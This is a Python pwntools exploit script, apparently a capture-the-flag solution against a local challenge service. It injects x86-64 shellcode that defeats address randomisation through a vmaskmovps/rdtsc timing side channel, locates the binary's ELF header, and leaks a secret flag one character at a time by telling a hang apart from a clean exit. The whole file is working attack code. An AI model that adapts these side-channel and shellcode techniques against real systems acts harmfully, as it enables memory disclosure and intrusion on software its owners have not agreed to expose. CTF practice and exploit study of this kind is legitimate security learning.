from pwn import *
from time import sleep , time
context.arch = 'amd64'
#                        b* 0x1337104f

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* 0x1337104f
                
                           c
                           b* 0x13371084
                           c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main")
libc=ELF("./libc.so.6")
nc="nc localhost 7001"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############

p.close()
import string
chars=string.printable
flag=""
for i in range(0,30):
    for char in chars:
        #p=process([exe.path])
        p.close()
        start=time()
        p=remote(host,port)
        leak=int(p.recvline().strip(),16)
        #log.info(hex(0x550000000000+leak-(exe.symbols["main"])))
        p.recvuntil("press exit to get the flag")
        #debug()
        elf_header=hex(0x00010102464c457f)
        flag_offset=exe.symbols["flag"]
        #char="e"
        position=i
        shellcode=f'''
        
        mov rbx,{hex(0x550000000000+leak-(exe.symbols["main"]))}
        mov rbp,0x570000000000

        test:
        vmaskmovps ymm0, ymm0, ymmword ptr[rbx]
        mfence
        rdtsc
        mov r10,rax    
        vmaskmovps ymm0, ymm0, ymmword ptr[rbx]
        mfence
        rdtsc 
        mov r12,rax
        sub r12,r10
        add rbx,0x1000000  
        cmp rbx,rbp
        jae exit
        cmp r12,0x70
        ja test
        // returns r12 

        sub rbx,0x1000000
        
        mov rcx,{elf_header}
        adjust:
        mov r10,[rbx]
        sub rbx,0x1000
        cmp r10,rcx
        jne adjust

        // rbx holds the address of pie-0x1000
        add rbx,0x1000 
        add rbx,{flag_offset}
        mov rdi,[rbx]

        // now guess the flag char by char
        gess_flag:
        add rdi,{position}
        mov dl,[rdi]
        cmp dl,{ord(char)&0xff}
        jne exit

        loop:
        jmp loop

        exit:
        mov rdi,8
        mov rax,0x3c
        syscall
        ret
        '''
        p.sendline(asm(shellcode))
        #p.interactive()
        #sleep(2)
        
        try:
                p.recv()                
                p.recv()                
                #p.sendline("aaaaa")
                ##print("lool")
                #p.sendline("aaaaa")
                #p.sendline("aaaaa")

        
        except:
                #log.critical("crash")
                pass
        end=time()
        if (end-start) < 2 :
                continue
        flag+=char
        log.critical(flag)
        break
#print(flag)


#p.interactive()